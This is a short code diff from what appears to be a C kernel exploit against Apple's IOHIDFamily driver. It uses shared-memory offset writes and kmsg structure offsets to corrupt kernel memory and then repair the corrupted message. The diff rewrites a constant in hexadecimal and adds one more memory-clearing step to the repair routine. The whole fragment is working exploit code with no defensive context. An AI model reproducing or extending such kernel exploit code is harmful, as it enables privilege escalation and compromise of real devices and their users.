@@ -33,7 +33,7 @@ const uint32_t DATA_FACTOR              =  0x10;
 const uint32_t DATA_HOLES               =  0x10;
 const int32_t  SHMEM_OFFSET             = -0x30000000;
 
-const size_t   NUM_KMSG                 = 16;
+const size_t   NUM_KMSG                 = 0x10;
 
 const uint64_t OFF_KMSG_IKM_HEADER      = 0x18;
 const uint64_t OFF_IKM_IMPORTANCE       = 0x38;
@@ -697,6 +697,8 @@ after:;
     LOG("Shmem kernel address: 0x%llx", shmem_kern);
 
     LOG("Repairing kmsg...");
+    ret = shmem_offset(hidClient, shmem_addr, offset + OFF_IKM_INHERITANCE + sizeof(uint32_t), 0x0, SHMEM_MODE_CLEAR);
+    if(ret != KERN_SUCCESS) goto out;
     ret = shmem_offset(hidClient, shmem_addr, offset + OFF_IKM_INHERITANCE, 0x0, SHMEM_MODE_CLEAR);
     if(ret != KERN_SUCCESS) goto out;
     ret = shmem_offset(hidClient, shmem_addr, offset + OFF_IKM_IMPORTANCE, 0x0, SHMEM_MODE_CLEAR);
